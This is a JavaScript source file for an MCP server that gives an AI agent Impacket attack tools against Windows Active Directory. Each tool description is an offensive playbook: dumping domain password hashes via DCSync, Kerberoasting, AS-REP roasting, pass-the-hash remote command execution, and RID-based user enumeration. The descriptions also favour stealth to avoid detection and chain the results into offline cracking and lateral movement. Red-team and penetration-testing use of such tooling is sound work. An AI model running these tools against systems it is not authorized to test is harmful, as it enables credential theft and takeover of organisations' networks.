"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
const mcp_js_1 = require("@modelcontextprotocol/sdk/server/mcp.js");
const stdio_js_1 = require("@modelcontextprotocol/sdk/server/stdio.js");
const zod_1 = require("zod");
const child_process_1 = require("child_process");
const args = process.argv.slice(2);
if (args.length === 0) {
    console.error("Usage: impacket-mcp <impacket-bin-dir>");
    process.exit(1);
}
// e.g. /opt/venv/bin
const binDir = args[0].replace(/\/$/, "");
function bin(name) {
    return `${binDir}/${name}`;
}
function runTool(binary, toolArgs) {
    return new Promise((resolve, reject) => {
        const proc = (0, child_process_1.spawn)(binary, toolArgs);
        let output = "";
        proc.stdout.on("data", (d) => { output += d.toString(); });
        proc.stderr.on("data", (d) => { output += d.toString(); });
        proc.on("close", (code) => {
            resolve({ content: [{ type: "text", text: output || `Process exited with code ${code}` }] });
        });
        proc.on("error", (err) => reject(new Error(`Failed to start ${binary}: ${err.message}`)));
    });
}
/** Build "domain/user:pass@host" or "user:pass@host" target string */
function buildTarget(host, username, password, domain) {
    const creds = password ? `${username}:${password}` : username;
    return domain ? `${domain}/${creds}@${host}` : `${creds}@${host}`;
}
const server = new mcp_js_1.McpServer({ name: "impacket", version: "1.0.0" });
// ─── Tool 1: secretsdump ──────────────────────────────────────────────────────
server.tool("impacket_secretsdump", `impacket MCP server — dump password hashes and secrets from Windows machines via secretsdump.

Use this tool when you need to:
- Dump NTLM hashes from a Domain Controller's NTDS.dit (use -just-dc)
- Extract SAM hashes from a local Windows machine
- Dump LSA secrets and cached credentials
- Perform DCSync attack against a DC (requires Domain Admin or replication rights)

Typical workflow:
1. Get DA credentials (from kerbrute spray or psexec shell)
2. secretsdump -just-dc to dump all domain hashes
3. Feed hashes to hashcat_crack (mode 1000 for NTLM) or use for pass-the-hash

Output format: username:RID:LMHASH:NTHASH:::
The NTHASH is what you use for pass-the-hash or hashcat -m 1000.`, {
    target: zod_1.z.string().describe("Target IP or hostname (e.g., '10.0.0.1', 'dc01.corp.local')."),
    username: zod_1.z.string().describe("Username with sufficient privileges (Domain Admin for DCSync, local admin for SAM dump)."),
    password: zod_1.z.string().optional().describe("Password. Omit if using hashes for pass-the-hash."),
    domain: zod_1.z.string().optional().describe("Domain name (e.g., 'corp.local'). Required for domain accounts."),
    hashes: zod_1.z.string().optional().describe("NTLM hash for pass-the-hash in LMHASH:NTHASH format (e.g., 'aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c'). Use instead of password."),
    dc_ip: zod_1.z.string().optional().describe("Domain Controller IP. Required for domain targets to locate Kerberos/LDAP."),
    just_dc: zod_1.z.boolean().optional().describe("Only dump domain credentials via DCSync (targets NTDS.dit on DC). Faster and less noisy than full dump. Use this when targeting a DC."),
    just_dc_ntlm: zod_1.z.boolean().optional().describe("Only dump NTLM hashes from DC (skips Kerberos keys and cleartext). Use for a smaller, faster output."),
    output_file: zod_1.z.string().optional().describe("Save hashes to this file (e.g., /data/dc_hashes.txt). Useful for piping into hashcat_crack."),
}, async ({ target, username, password, domain, hashes, dc_ip, just_dc, just_dc_ntlm, output_file }) => {
    const toolArgs = [];
    if (hashes)
        toolArgs.push("-hashes", hashes);
    if (dc_ip)
        toolArgs.push("-dc-ip", dc_ip);
    if (just_dc)
        toolArgs.push("-just-dc");
    if (just_dc_ntlm)
        toolArgs.push("-just-dc-ntlm");
    if (output_file)
        toolArgs.push("-outputfile", output_file);
    toolArgs.push(buildTarget(target, username, password, domain));
    return runTool(bin("impacket-secretsdump"), toolArgs);
});
// ─── Tool 2: Kerberoasting (GetUserSPNs) ─────────────────────────────────────
server.tool("impacket_kerberoast", `impacket MCP server — Kerberoasting: request TGS tickets for service accounts and output crackable hashes.

Use this tool when you need to:
- Extract Kerberos TGS hashes for service accounts (SPNs) to crack offline
- Identify over-privileged service accounts that use weak passwords
- Escalate privileges by cracking a service account hash with hashcat

How Kerberoasting works:
- Any authenticated domain user can request a TGS ticket for any SPN
- The ticket is encrypted with the service account's NTLM hash
- Crack the ticket offline with hashcat -m 13100 (Kerberoast)

Typical workflow:
1. impacket_kerberoast with valid domain credentials → gets TGS hashes
2. hashcat_crack with hash_type=13100 and a wordlist → crack the ticket
3. Use cracked credentials for lateral movement`, {
    domain: zod_1.z.string().describe("Active Directory domain name (e.g., 'corp.local')."),
    username: zod_1.z.string().describe("Any valid domain username — no special privileges needed."),
    password: zod_1.z.string().optional().describe("Password. Omit if using hashes."),
    hashes: zod_1.z.string().optional().describe("NTLM hash for pass-the-hash (LMHASH:NTHASH). Use instead of password."),
    dc_ip: zod_1.z.string().describe("Domain Controller IP address."),
    output_file: zod_1.z.string().optional().describe("Save TGS hashes to this file (e.g., /data/kerberoast.txt) for hashcat_crack input."),
    stealth: zod_1.z.boolean().optional().describe("Request tickets one at a time (slower but less detectable). Default false — requests all at once."),
}, async ({ domain, username, password, hashes, dc_ip, output_file, stealth }) => {
    const credential = password ? `${domain}/${username}:${password}` : `${domain}/${username}`;
    const toolArgs = [credential, "-dc-ip", dc_ip, "-request"];
    if (hashes)
        toolArgs.push("-hashes", hashes);
    if (output_file)
        toolArgs.push("-outputfile", output_file);
    if (stealth)
        toolArgs.push("-stealth");
    return runTool(bin("impacket-GetUserSPNs"), toolArgs);
});
// ─── Tool 3: AS-REP Roasting (GetNPUsers) ────────────────────────────────────
server.tool("impacket_asreproast", `impacket MCP server — AS-REP Roasting: get crackable hashes from accounts with Kerberos pre-authentication disabled.

Use this tool when you need to:
- Find and exploit accounts with "Do not require Kerberos preauthentication" set
- Get crackable AS-REP hashes without needing any credentials (if you have a username list)
- Identify misconfigured accounts during unauthenticated recon

How AS-REP Roasting works:
- Accounts with pre-auth disabled respond to AS-REQ without verifying identity
- The response contains data encrypted with the user's hash — crackable offline
- More powerful than Kerberoasting: can be done without any credentials

Typical workflow:
1. Run kerbrute_userenum to get a valid user list → save to file
2. impacket_asreproast with users_file (no credentials needed) → AS-REP hashes
3. hashcat_crack with hash_type=18200 → crack the hash`, {
    domain: zod_1.z.string().describe("Active Directory domain name (e.g., 'corp.local')."),
    dc_ip: zod_1.z.string().describe("Domain Controller IP address."),
    users_file: zod_1.z.string().optional().describe("Path to file with usernames to test (one per line). Use kerbrute_userenum output. No credentials needed when using this."),
    username: zod_1.z.string().optional().describe("Single username to test. Use users_file for bulk testing."),
    password: zod_1.z.string().optional().describe("Password for authenticated enumeration (finds all vulnerable accounts automatically)."),
    hashes: zod_1.z.string().optional().describe("NTLM hash for authenticated enumeration (LMHASH:NTHASH)."),
    output_file: zod_1.z.string().optional().describe("Save AS-REP hashes to this file (e.g., /data/asrep.txt) for hashcat_crack input."),
    format: zod_1.z.enum(["hashcat", "john"]).optional().describe("Output format for cracking. Default: hashcat (for hashcat -m 18200). Use 'john' for john_crack."),
}, async ({ domain, dc_ip, users_file, username, password, hashes, output_file, format }) => {
    const toolArgs = [];
    // Authenticated mode: domain/user:pass — finds all vulnerable accounts
    if (password || hashes) {
        const creds = password ? `${domain}/${username}:${password}` : `${domain}/${username}`;
        toolArgs.push(creds);
        if (hashes)
            toolArgs.push("-hashes", hashes);
        toolArgs.push("-request");
    }
    else {
        // Unauthenticated mode: just domain/ with a user list
        toolArgs.push(`${domain}/`);
        toolArgs.push("-no-pass");
        toolArgs.push("-request");
    }
    toolArgs.push("-dc-ip", dc_ip);
    if (users_file)
        toolArgs.push("-usersfile", users_file);
    else if (username)
        toolArgs.push("-usersfile", `/dev/stdin`);
    if (output_file)
        toolArgs.push("-outputfile", output_file);
    if (format)
        toolArgs.push("-format", format);
    return runTool(bin("impacket-GetNPUsers"), toolArgs);
});
// ─── Tool 4: Remote execution (wmiexec) ──────────────────────────────────────
server.tool("impacket_exec", `impacket MCP server — execute commands on a remote Windows machine using valid credentials or NTLM hash.

Use this tool when you need to:
- Run commands on a remote Windows machine after obtaining credentials
- Perform pass-the-hash attacks (use hashes param instead of password)
- Execute post-exploitation commands without uploading a binary
- Establish foothold or move laterally after credential compromise

Execution methods:
- wmiexec (default): uses WMI, leaves fewer traces, no service creation, output via SMB share
- psexec: creates a service, noisier but reliable on older systems
- smbexec: similar to psexec but uses a different method

Common post-exploitation commands:
- "whoami /all" — check current user and privileges
- "net user /domain" — list domain users
- "ipconfig /all" — network info
- "net localgroup administrators" — local admins
- "dir C:\\Users" — list user profiles`, {
    target: zod_1.z.string().describe("Target IP or hostname (e.g., '10.0.0.1', 'workstation01.corp.local')."),
    username: zod_1.z.string().describe("Username with local admin rights on the target."),
    password: zod_1.z.string().optional().describe("Password. Omit if using hashes for pass-the-hash."),
    domain: zod_1.z.string().optional().describe("Domain name. Use '.' for local accounts."),
    hashes: zod_1.z.string().optional().describe("NTLM hash for pass-the-hash (LMHASH:NTHASH). Powerful — no password needed, just the hash from secretsdump."),
    command: zod_1.z.string().describe("Command to execute on the remote system (e.g., 'whoami', 'net user /domain', 'dir C:\\\\Users')."),
    exec_method: zod_1.z.enum(["wmiexec", "psexec", "smbexec"]).optional().describe("Execution method. Default: wmiexec (stealthiest). Use psexec for older targets, smbexec as alternative."),
}, async ({ target, username, password, domain, hashes, command, exec_method }) => {
    const method = exec_method ?? "wmiexec";
    const toolArgs = [];
    if (hashes)
        toolArgs.push("-hashes", hashes);
    toolArgs.push(buildTarget(target, username, password, domain));
    toolArgs.push(command);
    return runTool(bin(`impacket-${method}`), toolArgs);
});
// ─── Tool 5: SID/RID enumeration (lookupsid) ─────────────────────────────────
server.tool("impacket_lookupsid", `impacket MCP server — enumerate domain users, groups, and computers by brute-forcing RIDs via SMB.

Use this tool when you need to:
- Enumerate all domain users and groups without LDAP access
- Discover usernames when other enumeration methods are blocked
- Map domain SIDs to user/group names for privilege escalation planning
- Works over SMB (port 445) — useful when LDAP (389/636) is firewalled

How RID brute force works:
- Every domain object has a SID ending in a RID (e.g., S-1-5-21-...-500 = Administrator)
- Well-known RIDs: 500=Administrator, 501=Guest, 512=Domain Admins group
- lookupsid iterates RIDs from 500 up to max_rid to enumerate all objects

Compared to kerbrute_userenum:
- lookupsid: works over SMB, needs credentials, returns SIDs and group memberships
- kerbrute: works over Kerberos, can run unauthenticated, returns only usernames`, {
    target: zod_1.z.string().describe("Target IP or hostname (usually a DC or domain-joined machine)."),
    username: zod_1.z.string().describe("Username for SMB authentication. Any domain user works."),
    password: zod_1.z.string().optional().describe("Password. Omit if using hashes."),
    domain: zod_1.z.string().optional().describe("Domain name (e.g., 'corp.local')."),
    hashes: zod_1.z.string().optional().describe("NTLM hash for pass-the-hash (LMHASH:NTHASH)."),
    max_rid: zod_1.z.number().optional().describe("Maximum RID to enumerate (default: 4000). Increase to 10000+ for large domains. Higher = more complete but slower."),
}, async ({ target, username, password, domain, hashes, max_rid }) => {
    const toolArgs = [];
    if (hashes)
        toolArgs.push("-hashes", hashes);
    toolArgs.push(buildTarget(target, username, password, domain));
    if (max_rid)
        toolArgs.push(max_rid.toString());
    return runTool(bin("impacket-lookupsid"), toolArgs);
});
// ─────────────────────────────────────────────────────────────────────────────
async function main() {
    const transport = new stdio_js_1.StdioServerTransport();
    await server.connect(transport);
    console.error("impacket MCP Server running on stdio");
}
main().catch((error) => {
    console.error("Fatal error in main():", error);
    process.exit(1);
});
